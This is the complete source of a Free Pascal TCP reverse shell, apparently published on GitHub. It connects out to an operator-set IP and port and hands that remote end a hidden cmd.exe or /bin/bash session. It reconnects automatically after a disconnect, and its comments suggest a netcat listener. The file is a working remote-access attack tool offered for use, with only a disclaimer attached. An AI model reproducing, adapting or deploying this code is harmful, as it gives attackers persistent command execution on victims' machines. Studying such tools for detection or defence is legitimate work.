program TCPReverseShell;

{
  Author      Marcus Fernström
  GitHub      https://github.com/MFernstrom/FPRevShell
  License     Apache 2.0
  Version     0.1
  About       TCP Reverse Shell
              When executed it connects to your ip and port over a TCP connection, giving you a CMD commandline on Windows or /bin/bash on Linux
              It will auto-reconnect if disconnected.
              Set the IP and port, run your netcat listener for example "nc -lvp 1337", and off you go.

  Targets     Tested on Windows and Linux x64
  Disclaimer  Use this only for good. I'm not responsible for anything happening when using this code.
}

{$mode objfpc}{$H+}

uses
  Sysutils,
  Classes,
  process,
  blcksock,
  synsock;

var
  AProcess        : TProcess;
  OutputStream    : TStream;
  BytesRead       : longint;
  inputStrings    : String;
  BytesAvailable  : DWord;
  sock            : TTCPBlockSocket;
  ip, port        : String;

procedure doConnect;
begin
  sock.CloseSocket;
  sock.Connect(ip, port);

  if sock.LastError <> 0 then begin
    // 10056 means we're already connected
    if sock.LastError <> 10056 then begin
      sock.CloseSocket;
      sleep(2000);
      doConnect;
    end;
  end;
end;

procedure Main;
var
  buffer: String;
begin
  doConnect;

  buffer := '';
  repeat
    buffer := sock.RecvPacket(2000);
    if length(buffer) > 0 then begin
      InputStrings := buffer;
      AProcess.Input.Write(InputStrings[1], length(InputStrings));
      sleep(50);

      BytesAvailable := AProcess.Output.NumBytesAvailable;
      BytesRead := 0;
      while BytesAvailable>0 do begin
        SetLength(Buffer, BytesAvailable);
        BytesRead := AProcess.OutPut.Read(Buffer[1], BytesAvailable);
        BytesAvailable := AProcess.Output.NumBytesAvailable;
        sock.SendString(copy(Buffer,1, BytesRead));
        writeln(copy(Buffer,1, BytesRead));
      end;
    end;

    if (sock.LastError <> 0) and (sock.LastError <> 10060) and (sock.LastError <> 110) then begin
      // We can ignore the timeouts as they are from the RecvPacker. Linux and Windows report different codes
      // Windows - 10060
      // Linux - 110
      doConnect;
    end;
  until false;
end;


begin
  // Example listener
  // nc -lvp 1337

  // Change these
  ip := 'your ip here';
  port := 'your port';

  AProcess := TProcess.Create(nil);
  AProcess.ShowWindow := swoHIDE;
  AProcess.Options := [poUsePipes, poStderrToOutPut];

  sock := TTCPBlockSocket.Create;

  {$IFDEF Windows}
    AProcess.Executable := 'cmd.exe';
    AProcess.Parameters.Add('/k');
  {$ENDIF Windows}

  {$IFDEF Unix}
    AProcess.Executable := '/bin/bash';
  {$ENDIF Unix}

  OutputStream := TMemoryStream.Create;
  try
    AProcess.Execute;
    main;
    AProcess.Free;
  finally
    OutputStream.Free;
  end;
end.
